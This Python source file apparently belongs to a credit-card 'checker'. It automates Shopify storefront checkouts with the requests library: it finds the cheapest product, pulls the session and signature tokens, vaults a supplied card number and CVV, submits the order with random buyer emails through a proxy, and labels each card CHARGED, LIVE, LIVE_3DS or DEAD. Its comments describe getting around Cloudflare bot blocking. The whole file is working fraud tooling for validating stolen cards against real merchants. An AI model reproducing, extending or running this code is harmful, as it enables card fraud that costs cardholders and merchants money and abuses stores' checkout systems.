import re
import uuid
import random
import logging
import json
import time
import requests
from typing import Optional
from urllib.parse import urlparse
from bs4 import BeautifulSoup

from core.card_parser import Card
from core.checker import CheckResult, _CheckoutContext, _classify_failure

logger = logging.getLogger(__name__)

# Replicate the core checkout flow using `requests` which doesn't get blocked by CF TLS

def _req_init_session(session, ctx: _CheckoutContext) -> bool:
    try:
        r = session.get(f"{ctx.base_url}/cart.js", headers=ctx.headers, timeout=15)
        if r.status_code not in (200, 302):
            r2 = session.get(ctx.base_url, headers=ctx.headers, timeout=15)
            if r2.status_code not in (200, 202, 301, 302):
                return False
            ctx.client_id = r2.cookies.get("_shopify_y") or ctx.client_id
            ctx.visit_token = r2.cookies.get("_shopify_s") or ctx.visit_token
            return True

        ctx.client_id = r.cookies.get("_shopify_y") or ctx.client_id
        ctx.visit_token = r.cookies.get("_shopify_s") or ctx.visit_token
        if r.status_code == 200:
            try:
                data = r.json()
                ctx.cart_token = data.get("token", "")
            except Exception:
                pass
        return True
    except Exception as e:
        logger.debug("init_session (req) failed: %s", e)
        return False

def _req_find_product(session, ctx: _CheckoutContext) -> bool:
    KNOWN_VARIANTS = {
        "artpop.com": "43093574385834",
        "colourpop.myshopify.com": "32230107873362",
    }
    netloc = urlparse(ctx.base_url).netloc.replace("www.", "")
    if netloc in KNOWN_VARIANTS:
        ctx.variant_id = KNOWN_VARIANTS[netloc]
        ctx.price = 10.00
        return True

    try:
        r = session.get(f"{ctx.base_url}/products.json?limit=250", headers=ctx.headers, timeout=15)
        if r.status_code == 200:
            data = r.json()
            products = data.get("products", [])
            cheapest = None
            min_price = float("inf")
            for p in products:
                for v in p.get("variants", []):
                    if v.get("available") is False: continue
                    try:
                        price = float(v.get("price", "0"))
                        if 0 < price < min_price:
                            min_price = price
                            cheapest = v
                            ctx.product_id = p["id"]
                    except (ValueError, KeyError, TypeError):
                        continue
            if cheapest:
                ctx.variant_id = cheapest["id"]
                ctx.price = min_price
                return True

        r2 = session.get(f"{ctx.base_url}/collections/all", headers=ctx.headers, timeout=15)
        if r2.status_code == 200:
            html = r2.text
            variants = re.findall(r'variant[_-]?id["\']?\s*[:=]\s*["\']?(\d{13,15})["\']?', html, re.IGNORECASE)
            if not variants:
                variants = re.findall(r'variant(?:s)?[^\w]*?id[^\d]*?(\d{13,15})', html, re.IGNORECASE)
            if variants:
                ctx.variant_id = variants[0]
                ctx.price = 10.00
                return True
    except Exception as e:
        logger.debug("find_product (req) failed: %s", e)
    return False

def _req_add_cart(session, ctx: _CheckoutContext) -> bool:
    headers = ctx.headers.copy()
    headers.update({
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "accept": "application/json, text/javascript, */*; q=0.01",
        "x-requested-with": "XMLHttpRequest",
        "origin": ctx.base_url
    })
    data = {"id": str(ctx.variant_id), "quantity": "1", "form_type": "product", "utf8": "✓"}
    try:
        r = session.post(f"{ctx.base_url}/cart/add.js", data=data, headers=headers, timeout=15)
        if r.status_code == 200:
            try:
                j = r.json()
                ctx.cart_token = j.get("cart_token", ctx.cart_token)
            except Exception: pass
            return True
        return False
    except Exception as e:
        logger.debug("add_cart (req) failed: %s", e)
        return False

def _req_start_checkout(session, ctx: _CheckoutContext) -> bool:
    headers = ctx.headers.copy()
    headers.update({
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "content-type": "application/x-www-form-urlencoded",
        "cache-control": "max-age=0",
        "origin": ctx.base_url,
        "referer": f"{ctx.base_url}/cart",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1"
    })
    data = f"updates%5B%5D=1&checkout=&cart_token={ctx.cart_token or ''}"
    
    current_url = f"{ctx.base_url}/cart"
    method = "POST"
    payload = data
    
    try:
        for _ in range(3):
            if method == "POST":
                r = session.post(current_url, data=payload, headers=headers, allow_redirects=True, timeout=15)
            else:
                r = session.get(current_url, headers=headers, allow_redirects=True, timeout=15)
                
            ctx.checkout_url = r.url
            html = r.text
            ctx.last_html = html
            
            if "captcha" in html.lower() or "datadome" in html.lower() or ("cloudflare" in html.lower() and "challenge" in html.lower()):
                logger.warning("Checkpoint/CAPTCHA detected on %s during checkout start (req)", current_url)
                # Fallback to permalink
                try:
                    pl = f"{ctx.base_url}/cart/{ctx.variant_id}:1"
                    r_pl = session.get(pl, headers=headers, allow_redirects=True, timeout=15)
                    ctx.checkout_url = r_pl.url
                    html = r_pl.text
                    ctx.last_html = html
                    match = re.search(r"/checkouts/(?:cn/)?([a-zA-Z0-9]+)", ctx.checkout_url)
                    if match and "captcha" not in html.lower() and "challenge" not in html.lower():
                        ctx.checkout_id = match.group(1)
                        return True
                except Exception: pass
                return False
                
            js_match = re.search(r'window\.location(?:\.href)?\s*=\s*["\']([^"\']+)["\']', html)
            if js_match:
                redirect_url = js_match.group(1)
                if redirect_url.startswith('/'):
                    parsed_base = urlparse(ctx.base_url)
                    redirect_url = f"{parsed_base.scheme}://{parsed_base.netloc}{redirect_url}"
                current_url = redirect_url
                method = "GET"
                payload = None
                headers["referer"] = ctx.checkout_url
                continue
                
            match = re.search(r"/checkouts/(?:cn/)?([a-zA-Z0-9]+)", ctx.checkout_url)
            if match:
                ctx.checkout_id = match.group(1)
                return True
            break
        return False
    except Exception as e:
        logger.debug("start_checkout (req) failed: %s", e)
        return False

def _req_get_metadata(session, ctx: _CheckoutContext) -> bool:
    headers = ctx.headers.copy()
    headers.update({
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "upgrade-insecure-requests": "1"
    })
    try:
        r = session.get(ctx.checkout_url, headers=headers, timeout=15)
        html = r.text
        soup = BeautifulSoup(html, 'html.parser')

        meta_token = soup.find('meta', {'name': 'serialized-sessionToken'})
        if meta_token and meta_token.get('content'):
            ctx.session_token = meta_token['content'].strip('"&quot;')
            
        if "captcha" in html.lower() or "datadome" in html.lower() or "cloudflare" in html.lower() and "challenge" in html.lower():
            return False
            
        scripts_text = " ".join([script.string for script in soup.find_all('script') if script.string])

        if not ctx.session_token:
            for pat in [r'"sessionToken"\s*:\s*"(AAEB[^"]+)"', r"'sessionToken'\s*:\s*'(AAEB[^']+)'", r'sessionToken[\s:=]+["\']?(AAEB[A-Za-z0-9_\-]+)', r'(AAEB[A-Za-z0-9_\-]{30,})']:
                m = re.search(pat, html)
                if m:
                    ctx.session_token = m.group(1)
                    break

        for pat in [r'"shopifyPaymentRequestIdentificationSignature"\s*:\s*"(eyJ[^"]+)"', r'"identificationSignature"\s*:\s*"(eyJ[^"]+)"', r'"paymentsSignature"\s*:\s*"(eyJ[^"]+)"', r'"signature"\s*:\s*"(eyJ[^"]+)"', r'(eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)']:
            m = re.search(pat, scripts_text) or re.search(pat, html)
            if m:
                ctx.signature = m.group(1)
                break

        for pat in [r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"', r'stableId[\s:=]+["\']([0-9a-f-]{36})']:
            m = re.search(pat, scripts_text) or re.search(pat, html)
            if m:
                ctx.stable_id = m.group(1)
                break

        m = re.search(r'queueToken(?:&quot;|")\s*(?::|=>)\s*(?:&quot;|")([^"&]+)(?:&quot;|")', html) or re.search(r'"queueToken"\s*:\s*"([^"]+)"', scripts_text)
        ctx.queue_token = m.group(1) if m else None

        m = re.search(r'paymentMethodIdentifier(?:&quot;|")\s*(?::|=>)\s*(?:&quot;|")([^"&]+)(?:&quot;|")', html) or re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"', scripts_text)
        ctx.payment_method_identifier = m.group(1) if m else None

        m = re.search(r'"shopId"\s*:\s*(\d+)', scripts_text) or re.search(r'shop_id[\s:=]+(\d+)', html)
        ctx.shop_id = m.group(1) if m else "25603230"

        m = re.search(r'"buildId"\s*:\s*"([a-f0-9]{40})"', scripts_text) or re.search(r'/build/([a-f0-9]{40})/', html)
        ctx.build_id = m.group(1) if m else ctx.build_id

        pci_m = re.search(r'checkout\.pci\.shopifyinc\.com/build/([a-f0-9]+)/', html)
        ctx.pci_build_hash = pci_m.group(1) if pci_m else ctx.pci_build_hash

        signed_handles = re.findall(r'"signedHandle"\s*:\s*"([^"]+)"', scripts_text)
        if not signed_handles:
            raw = re.findall(r'\\"signedHandle\\":\\"([^\\"]+)', html)
            signed_handles = [h.replace("\\n", "").replace("\\r", "") for h in raw]
        ctx.signed_handles = signed_handles

        parsed = urlparse(ctx.checkout_url)
        if "shopify.com" in parsed.netloc and "checkout." in parsed.netloc:
            ctx.graphql_base = f"{parsed.scheme}://{parsed.netloc}"
        else:
            ctx.graphql_base = ctx.base_url

        return bool(ctx.session_token)
    except Exception as e:
        logger.debug("get_metadata (req) failed: %s", e)
        return False

def _req_vault_card(session, ctx: _CheckoutContext, card: Card):
    url = "https://checkout.pci.shopifyinc.com/sessions"
    headers = {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://checkout.pci.shopifyinc.com",
        "referer": f"https://checkout.pci.shopifyinc.com/build/{ctx.pci_build_hash}/number-ltr.html?identifier=&locationURL={ctx.checkout_url or ''}",
        "sec-ch-ua": ctx.ch_ua,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": ctx.platform,
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": ctx.ua,
        "priority": "u=1, i",
    }
    if ctx.signature:
        headers["shopify-identification-signature"] = ctx.signature

    payload = {
        "credit_card": {
            "number": card.number,
            "month": int(card.month),
            "year": int(card.year),
            "verification_value": card.cvv,
            "start_month": None,
            "start_year": None,
            "issue_number": "",
            "name": f"{ctx.address['firstName']} {ctx.address['lastName']}",
        },
        "payment_session_scope": urlparse(ctx.base_url).netloc,
    }

    try:
        r = session.post(url, json=payload, headers=headers, timeout=15)
        try:
            data = r.json()
        except Exception:
            data = {}
        if r.status_code in (200, 201):
            vault_id = data.get("id")
            if vault_id:
                return vault_id, None
            return None, data.get("error", "") or "no_vault_id"
        return None, data.get("error", "") or data.get("message", "") or f"http_{r.status_code}"
    except Exception as e:
        return None, str(e)

# We can re-use the _PROPOSAL_QUERY and _SUBMIT_MUTATION from checker.py
from core.checker import _PROPOSAL_QUERY, _SUBMIT_MUTATION, _POLL_QUERY

def _req_negotiate_proposal(session, ctx: _CheckoutContext, card: Card) -> bool:
    if not ctx.session_token or not ctx.checkout_id: return False
    url = f"{ctx.graphql_base}/checkouts/unstable/graphql"
    headers = ctx.headers.copy()
    headers.update({
        "accept": "application/json",
        "content-type": "application/json",
        "shopify-checkout-client": "checkout-web/1.0",
        "shopify-checkout-source": f'id="{ctx.checkout_id}", type="cn"',
        "x-checkout-web-source-id": ctx.checkout_id,
        "x-checkout-one-session-token": ctx.session_token
    })
    
    address = ctx.address
    delivery_line = {
        "destination": {
            "partialStreetAddress": {
                "address1": address["address1"],
                "address2": "",
                "city": address["city"],
                "countryCode": address["countryCode"],
                "firstName": address["firstName"],
                "lastName": address["lastName"],
                "zoneCode": address["zoneCode"],
                "postalCode": address["postalCode"],
                "phone": address["phone"],
                "oneTimeUse": False,
            }
        },
        "targetMerchandiseLines": {"lines": [{"stableId": ctx.stable_id}]},
        "deliveryMethodTypes": ["SHIPPING"],
        "destinationChanged": False,
        "selectedDeliveryStrategy": {
            "deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}
        },
        "expectedTotalPrice": {"any": True},
    }

    payload = {
        "operationName": "Proposal",
        "query": _PROPOSAL_QUERY,
        "variables": {
            "delivery": {"deliveryLines": [delivery_line], "noDeliveryRequired": [], "supportsSplitShipping": True},
            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {"streetAddress": {k: address.get(k,"") for k in ["address1", "city", "countryCode", "firstName", "lastName", "zoneCode", "postalCode", "phone"]}},
            },
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": ctx.stable_id,
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{ctx.variant_id}",
                            "variantId": f"gid://shopify/ProductVariant/{ctx.variant_id}",
                            "properties": [],
                            "sellingPlanId": None,
                        }
                    },
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"any": True},
                    "lineComponents": [],
                }]
            },
            "buyerIdentity": {
                "customer": {"presentmentCurrency": "USD", "countryCode": "US"},
                "email": random_email(address["firstName"], address["lastName"]),
            },
            "taxes": {"proposedTotalAmount": {"any": True}},
            "sessionInput": {"sessionToken": ctx.session_token},
            "tip": {"tipLines": []},
            "note": {"message": None, "customAttributes": []},
            "scriptFingerprint": {"signature": None, "signatureUuid": None, "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []},
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": [],
            "memberships": {"memberships": []},
        },
    }

    max_polls = 6
    shipping_handle, shipping_amount, actual_total = None, None, None
    for attempt in range(max_polls):
        try:
            r = session.post(url, json=payload, headers=headers, timeout=15)
            if r.status_code != 200:
                time.sleep(1)
                continue
            data = r.json()
            result = data.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {})
            if result.get("__typename") != "NegotiationResultAvailable":
                time.sleep(0.5)
                continue

            ctx.queue_token = result.get("queueToken", ctx.queue_token)
            sp = result.get("sellerProposal", {})

            dt = sp.get("delivery", {})
            if dt.get("__typename") == "FilledDeliveryTerms":
                lines = dt.get("deliveryLines", [])
                if lines:
                    strategies = lines[0].get("availableDeliveryStrategies", [])
                    if strategies:
                        shipping_handle = strategies[0].get("handle")
                        amt = strategies[0].get("amount", {})
                        if amt.get("__typename") == "MoneyValueConstraint":
                            shipping_amount = amt.get("value", {}).get("amount")
                            
            ct = sp.get("checkoutTotal", {})
            if ct.get("__typename") == "MoneyValueConstraint":
                actual_total = ct.get("value", {}).get("amount")
                ctx.currency_code = ct.get("value", {}).get("currencyCode", "USD")

            de = sp.get("deliveryExpectations", {})
            if de.get("__typename") == "FilledDeliveryExpectationTerms":
                ctx.delivery_expectations = [{"signedHandle": exp.get("signedHandle")} for exp in de.get("deliveryExpectations", []) if exp.get("signedHandle")]

            if shipping_handle and actual_total and ctx.delivery_expectations:
                break
            time.sleep(1)
        except Exception:
            time.sleep(1)

    ctx.shipping_handle = shipping_handle
    ctx.shipping_amount = shipping_amount
    ctx.actual_total = actual_total
    return bool(shipping_handle and actual_total)

def _req_submit(session, ctx: _CheckoutContext, card: Card, vault_id: str) -> Optional[str]:
    if not ctx.session_token or not ctx.checkout_id: return None
    url = f"{ctx.graphql_base}/checkouts/unstable/graphql"
    headers = ctx.headers.copy()
    headers.update({
        "accept": "application/json",
        "content-type": "application/json",
        "origin": ctx.base_url,
        "referer": ctx.checkout_url,
        "shopify-checkout-client": "checkout-web/1.0",
        "shopify-checkout-source": f'id="{ctx.checkout_id}", type="cn"',
        "x-checkout-one-session-token": ctx.session_token,
        "x-checkout-web-deploy-stage": "production",
        "x-checkout-web-server-handling": "fast",
        "x-checkout-web-server-rendering": "yes",
        "x-checkout-web-source-id": ctx.checkout_id,
        "x-checkout-web-build-id": ctx.build_id
    })

    address = ctx.address
    buyer_email = random_email(address['firstName'], address['lastName'])
    shipping_handle = ctx.shipping_handle or "any"
    actual_total = ctx.actual_total or str(ctx.price)
    curr = ctx.currency_code or "USD"
    pm_identifier = ctx.payment_method_identifier or "733e0067953851d75a089254f3ab0445"
    
    billing_addr = {k: address.get(k,"") for k in ["address1", "address2", "city", "countryCode", "postalCode", "company", "firstName", "lastName", "zoneCode", "phone"]}
    
    payload = {
        "query": _SUBMIT_MUTATION,
        "operationName": "SubmitForCompletion",
        "variables": {
            "attemptToken": f"{ctx.checkout_id}-{uuid.uuid4().hex[:10]}",
            "metafields": [],
            "analytics": {"requestUrl": ctx.checkout_url, "pageId": str(uuid.uuid4()).upper()},
            "input": {
                "sessionInput": {"sessionToken": ctx.session_token},
                "queueToken": ctx.queue_token,
                "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                "delivery": {
                    "deliveryLines": [{
                        "destination": {"streetAddress": billing_addr},
                        "selectedDeliveryStrategy": {
                            "deliveryStrategyByHandle": {"handle": shipping_handle, "customDeliveryRate": False},
                            "options": {"phone": address["phone"]}
                        } if shipping_handle != "any" else {
                            "deliveryStrategyMatchingConditions": {"estimatedTimeInTransit": {"any": True}, "shipments": {"any": True}},
                            "options": {"phone": address["phone"]}
                        },
                        "targetMerchandiseLines": {"lines": [{"stableId": ctx.stable_id}]},
                        "deliveryMethodTypes": ["SHIPPING"],
                        "expectedTotalPrice": {"any": True} if not ctx.shipping_amount else {"value": {"amount": str(ctx.shipping_amount), "currencyCode": curr}},
                        "destinationChanged": False,
                    }],
                    "noDeliveryRequired": [], "useProgressiveRates": False, "supportsSplitShipping": True,
                },
                "deliveryExpectations": {"deliveryExpectationLines": ctx.delivery_expectations or [{"signedHandle": sh} for sh in ctx.signed_handles]},
                "merchandise": {
                    "merchandiseLines": [{
                        "stableId": ctx.stable_id,
                        "merchandise": {
                            "productVariantReference": {
                                "id": f"gid://shopify/ProductVariantMerchandise/{ctx.variant_id}",
                                "variantId": f"gid://shopify/ProductVariant/{ctx.variant_id}",
                                "properties": [],
                                "sellingPlanId": None,
                            }
                        },
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"any": True},
                        "lineComponents": [],
                    }]
                },
                "memberships": {"memberships": []},
                "payment": {
                    "totalAmount": {"value": {"amount": str(actual_total), "currencyCode": curr}},
                    "paymentLines": [{
                        "paymentMethod": {
                            "directPaymentMethod": {
                                "paymentMethodIdentifier": pm_identifier,
                                "sessionId": vault_id,
                                "billingAddress": {"streetAddress": billing_addr},
                                "cardSource": None,
                            }
                        },
                        "amount": {"value": {"amount": str(actual_total), "currencyCode": curr}},
                    }],
                    "billingAddress": {"streetAddress": billing_addr},
                    "creditCardBin": card.number[:8],
                },
                "buyerIdentity": {
                    "customer": {"presentmentCurrency": curr, "countryCode": "US"},
                    "email": buyer_email, "emailChanged": False, "phoneCountryCode": "US",
                    "marketingConsent": [
                        {"sms": {"consentState": "DECLINED", "value": address["phone"], "countryCode": "US"}},
                        {"email": {"consentState": "GRANTED", "value": buyer_email}},
                    ],
                    "shopPayOptInPhone": {"number": address["phone"], "countryCode": "US"},
                    "rememberMe": False,
                },
                "tip": {"tipLines": []},
                "taxes": {"proposedTotalAmount": {"any": True}},
                "note": {"message": None, "customAttributes": []},
                "localizationExtension": {"fields": []},
                "nonNegotiableTerms": None,
                "scriptFingerprint": {"signature": None, "signatureUuid": None, "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []},
                "optionalDuties": {"buyerRefusesDuties": False},
                "captcha": None,
                "cartMetafields": [],
            },
        },
    }

    ctx.submit_start_time = time.time()
    for attempt in range(8):
        try:
            r = session.post(url, json=payload, headers=headers, timeout=15)
            data = r.json()
            submit = data.get("data", {}).get("submitForCompletion", {})
            tn = submit.get("__typename", "")

            if tn in ("SubmitSuccess", "SubmitAlreadyAccepted", "SubmittedForCompletion"):
                return submit.get("receipt", {}).get("id")
            elif tn == "Throttled":
                time.sleep(submit.get("pollAfter", 1000) / 1000.0)
                payload["variables"]["input"]["queueToken"] = submit.get("queueToken", ctx.queue_token)
            elif tn == "SubmitRejected":
                if "WAITING_PENDING_TERMS" in [e.get("code", "") for e in submit.get("errors", [])]:
                    time.sleep(1)
                    continue
                return None
            else:
                time.sleep(1)
        except Exception:
            time.sleep(1)
    return None

def _req_poll(session, ctx: _CheckoutContext, receipt_id: str) -> tuple:
    url = f"{ctx.graphql_base}/checkouts/unstable/graphql"
    headers = ctx.headers.copy()
    headers.update({
        "accept": "application/json",
        "content-type": "application/json",
        "referer": ctx.checkout_url,
        "shopify-checkout-client": "checkout-web/1.0",
        "shopify-checkout-source": f'id="{ctx.checkout_id}", type="cn"',
        "x-checkout-one-session-token": ctx.session_token,
        "x-checkout-web-deploy-stage": "production",
        "x-checkout-web-server-handling": "fast",
        "x-checkout-web-server-rendering": "no",
        "x-checkout-web-source-id": ctx.checkout_id,
        "x-checkout-web-build-id": ctx.build_id
    })

    payload = {
        "query": _POLL_QUERY,
        "operationName": "PollForReceipt",
        "variables": {"receiptId": receipt_id, "sessionToken": ctx.session_token},
    }

    for _ in range(12):
        try:
            r = session.post(url, json=payload, headers=headers, timeout=15)
            receipt = r.json().get("data", {}).get("receipt", {})
            tn = receipt.get("__typename", "")

            if tn == "ProcessedReceipt" or "orderIdentity" in receipt:
                return ("CHARGED", f"Order ID: {receipt.get('orderIdentity', {}).get('id', 'N/A')}")
            elif tn == "ActionRequiredReceipt":
                return ("LIVE_3DS", "3ds_required")
            elif tn == "FailedReceipt":
                err = receipt.get("processingError", {})
                return _classify_failure(err.get("code", "UNKNOWN"), err.get("messageUntranslated", ""), time.time() - ctx.submit_start_time)
            elif tn in ("ProcessingReceipt", "WaitingReceipt"):
                time.sleep(receipt.get("pollDelay", 3000) / 1000.0)
        except Exception:
            time.sleep(2)
    return ("ERROR", "Polling timed out")

def run_requests_checkout(card: Card, store_url: str, proxy: str, prof) -> CheckResult:
    """Run the entire checkout flow synchronously using requests.
    Hybrid approach: Use direct connection to bypass CF for storefront navigation,
    then switch to user's proxy for payment submission.
    """
    ctx = _CheckoutContext(store_url, prof, prof.get_headers("navigate"))
    ctx.headers["priority"] = "u=1, i"
    
    # Storefront session (Direct to avoid CF blocks on user proxy)
    session_direct = requests.Session()
    
    # Payment session (Uses provided proxy)
    session_proxy = requests.Session()
    if proxy:
        proxies = {"http": proxy, "https": proxy}
        session_proxy.proxies.update(proxies)
        
    if not _req_init_session(session_direct, ctx): return CheckResult("DEAD", "session_init_failed", "Shopify Payments", 0.0, store_url, card)
    if not _req_find_product(session_direct, ctx): return CheckResult("DEAD", "no_products_found", "Shopify Payments", 0.0, store_url, card)
    if not _req_add_cart(session_direct, ctx): return CheckResult("DEAD", "cart_failed", "Shopify Payments", ctx.price, store_url, card)
    
    if not _req_start_checkout(session_direct, ctx): 
        err_msg = "checkout_start_failed"
        if "cloudflare" in ctx.last_html.lower(): err_msg = "checkout_cf_blocked"
        return CheckResult("DEAD", err_msg, "Shopify Payments", ctx.price, store_url, card)
        
    if not _req_get_metadata(session_direct, ctx): return CheckResult("DEAD", "token_extraction_failed", "Shopify Payments", ctx.price, store_url, card)
    
    # --- Switch to Proxy Session for Payments ---
    # Transfer cookies to proxy session just in case
    for cookie in session_direct.cookies:
        session_proxy.cookies.set_cookie(cookie)
        
    vault_id, vault_err = _req_vault_card(session_proxy, ctx, card)
    if not vault_id: return CheckResult("DEAD", f"card_vault_failed: {vault_err}" if vault_err else "card_vault_failed", "Shopify Payments", ctx.price, store_url, card)
    
    _req_negotiate_proposal(session_proxy, ctx, card)
    receipt_id = _req_submit(session_proxy, ctx, card, vault_id)
    if not receipt_id: return CheckResult("DEAD", "submission_rejected", "Shopify Payments", ctx.price, store_url, card)
    
    category, detail = _req_poll(session_proxy, ctx, receipt_id)
    if category == "CHARGED": return CheckResult("CHARGED", detail, "Shopify Payments", ctx.price, store_url, card)
    elif category == "APPROVED": return CheckResult("LIVE", detail, "Shopify Payments", ctx.price, store_url, card)
    elif category == "DECLINED": return CheckResult("DEAD", detail, "Shopify Payments", ctx.price, store_url, card)
    elif category == "LIVE_3DS": return CheckResult("LIVE_3DS", detail, "Shopify Payments", ctx.price, store_url, card)
    else: return CheckResult("DEAD", detail or "unknown_error", "Shopify Payments", ctx.price, store_url, card)
